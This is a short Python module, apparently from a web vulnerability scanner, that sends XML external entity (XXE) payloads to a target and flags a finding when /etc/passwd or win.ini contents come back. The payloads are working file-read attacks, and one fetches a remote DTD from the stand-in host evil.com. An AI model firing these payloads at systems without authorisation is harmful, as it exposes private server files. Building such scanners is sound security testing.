from typing import Optional
import aiohttp

XXE_PAYLOADS = [
    """<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><root>&test;</root>""",
    """<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///c:/windows/win.ini">]><root>&test;</root>""",
    """<?xml version="1.0"?><!DOCTYPE root [<!ENTITY % remote SYSTEM "http://evil.com/xxe.dtd">%remote;]><root/>""",
]


async def run(target: str, scan_id: Optional[int] = None) -> list[dict]:
    results = []
    for payload in XXE_PAYLOADS:
        try:
            async with aiohttp.ClientSession() as session:
                async with session.post(
                    f"https://{target}" if not target.startswith("http") else target,
                    data=payload,
                    headers={"Content-Type": "application/xml"},
                    timeout=aiohttp.ClientTimeout(total=10),
                ) as resp:
                    text = await resp.text()
                    if "root:" in text or "[boot loader]" in text:
                        results.append({
                            "finding_type": "XXE",
                            "severity": "critical",
                            "url": target,
                            "evidence": "File content returned in response via XXE",
                        })
                        break
        except Exception:
            pass
    return results
